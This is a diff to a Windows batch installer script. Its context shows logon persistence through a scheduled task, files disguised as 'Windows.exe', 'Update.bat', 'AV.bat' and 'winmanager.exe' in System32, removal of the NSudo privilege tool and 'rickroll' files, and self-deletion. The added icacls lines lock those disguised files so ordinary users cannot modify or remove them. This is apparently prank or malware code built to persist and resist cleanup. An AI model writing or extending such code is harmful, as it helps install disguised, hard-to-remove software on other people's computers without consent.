@@ -48,6 +48,12 @@ SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Update.bat
 del /f rickroll.*
 del /f NSudo.exe
 powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
+icacls  "%systemroot%\System32\Windowsexe\Windows.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
+icacls  "%systemroot%\System32\Windowsexe\Windows2.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
+icacls  "%systemroot%\System32\Windowsexe\Windows3.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
+icacls  "%systemroot%\System32\Windowsexe\Update.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
+icacls  "%systemroot%\System32\Windowsexe\AV.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
+icacls  "%systemroot%\System32\Windows Manager\winmanager.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 call :deleteSelf&exit
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
